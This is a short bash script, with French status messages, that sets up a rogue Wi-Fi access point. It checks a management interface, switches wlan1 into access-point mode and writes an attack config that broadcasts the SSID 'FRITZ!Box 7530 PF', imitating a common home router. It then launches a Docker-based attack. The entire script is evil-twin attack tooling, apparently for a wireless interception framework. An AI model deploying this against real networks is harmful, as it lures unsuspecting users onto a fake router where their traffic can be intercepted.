#!/bin/bash
MGMT_IP="192.168.178.65"
WLAN0_IP=$(ip -4 addr show wlan0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "$WLAN0_IP" != "$MGMT_IP" ]; then
    echo "[!!!] ERREUR : wlan0 n'a pas l'IP de management ($MGMT_IP) ! IP actuelle: $WLAN0_IP"
    exit 1
fi
echo "[+] wlan0 OK ($MGMT_IP)"

echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

cat <<PULP > attack.pulp
set interface wlan1
set ssid "FRITZ!Box 7530 PF"
set proxy noproxy
start
PULP

echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build
